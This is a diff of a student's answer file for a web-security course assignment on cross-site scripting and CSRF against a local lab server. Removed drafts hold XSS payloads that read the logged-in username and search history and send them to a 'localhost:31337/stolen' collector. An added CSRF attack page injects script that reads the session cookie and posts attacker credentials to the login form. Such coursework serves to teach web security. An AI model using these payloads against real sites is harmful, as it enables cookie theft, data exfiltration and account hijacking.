@@ -9,7 +9,6 @@ Reminder: You may NOT work with the same partner on multiple assignments.
 
 
 NAMES: Mia McDuffie
-z
 ________________________________________________________________________________________
 
 Part 1: Cross-site Scripting (35%)
@@ -45,77 +44,9 @@ Part 1: Cross-site Scripting (35%)
 
 	1.3) Remove " ' and ;
 
-		http://0.0.0.0:8080/search?xssdefense=3&q=TODO
-
-		Payload:
-
-		<video><source onerror="
-			var username = document.getElementById('logged-in-user').innerHTML;
-			alert(username);
-		};
-		">
-
-
-
-	https://www.hashemian.com/tools/html-url-encode-decode.php
-		<video><source onerror="
-			window.onload = function(){ 
-				var username = document.getElementById('logged-in-user').innerHTML;
-				alert(username);
-			};
-		">
-
-		<script> alert("Hi"); </script>
-
-		<script>
-			window.onload = function(){ 
-
-			};
-
-
-		</script>
-
-			var last_search = document.getElementsByClassName("history-item")[1].innerHTML;
-				var theUrl = "http://localhost:31337/stolen?user=" + username + "&last_search=" + last_search;
-				var xmlHttp = new XMLHttpRequest();
-				xmlHttp.open( "GET", theUrl, true );
-				xmlHttp.send(null);
-
-		<script>
-			window.onload = function(){ 
-				{var username = document.getElementById(`logged-in-user`).innerHTML}
-				alert(`Hi`)
-			
-			};
-		</script>
-
-
-
-
-
-		<video><source onerror="
-			window.onload = function(){ 
-				var username = document.getElementById('logged-in-user').innerHTML;
-				var last_search = document.getElementsByClassName('history-item')[1].innerHTML;
-				var theUrl = 'http://localhost:31337/stolen?user=' + username + ' &last_search=' + last_search;
-				var xmlHttp = new XMLHttpRequest();
-				xmlHttp.open( 'GET', theUrl, true );
-				xmlHttp.send(null);
-				alert(theUrl);
-			};
-		">
-
-
-
-		theUrl:
-
-		
-
-	
-
 		http://0.0.0.0:8080/search?q=%3CA+HREF%3Dhttp%3A%2F%2Fgoogle.com%2F%3Elink%3C%2FA%3E
+
 		<A HREF=http://google.com/>link</A>
-		
 
 
 	1.4) [Optional extra credit] Encode < and >
@@ -171,9 +102,34 @@ Part 2: Cross-site Request Forgery (20%)
 
 	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0
 
-		<html>
-			TODO
-		</html>
+	<!DOCTYPE html>
+	<html lang="en">
+
+	<head>
+		<title>Attack</title>
+		<script type="module" src="/path/to/js.cookie.mjs"></script>
+		<link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet"
+			media="screen">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+		<script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+		<script>
+			window.onload = function () {
+				document.getElementsByClassName("form-inline")[0].click();
+			};
+		</script>
+	</head>
+
+	<body>
+		<div class="col-xs-4">
+			<!-- Login / create account form -->
+			<div class="well">
+				<a href="<script> window.onload = function(){ var cookie = document.cookie.split(';')[1].split('=')[1]; var params = 'username=attacker&password=URpwn3d&cookie=' + cookie; var theUrl = 'http://0.0.0.0:8080/login'; var xmlHttp = new XMLHttpRequest(); xmlHttp.open('POST', theUrl, true); xmlHttp.send(params); alert('Past');  }; </script>"
+					class="form-inline"> </a>
+			</div>
+		</div>
+	</body>
+
+	</html>
 
 
 	2.2) [Optional extra credit] Token validation (without XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=&xssdefense=4
@@ -270,6 +226,7 @@ Additional Questions
 		---- 3 ----
 		https://sechow.com/bricks/docs/login-1.html
 		https://www.w3schools.com/tags/att_form_method.asp
+		https://beautifytools.com/html-beautifier.php
 
 		---4---
 
@@ -277,6 +234,8 @@ Additional Questions
 		https://argon2-cffi.readthedocs.io/en/stable/
 		https://argon2-cffi.readthedocs.io/en/stable/api.html#argon2.exceptions.InvalidHash
 		https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+		https://www.tutorialspoint.com/How-to-catch-IndexError-Exception-in-Python
+		https://www.ibm.com/garage/method/practices/code/protect-from-cross-site-scripting/
 
 	Q3 (optional, ungraded). Do you have any suggestions for improving this assignment in the future?
 
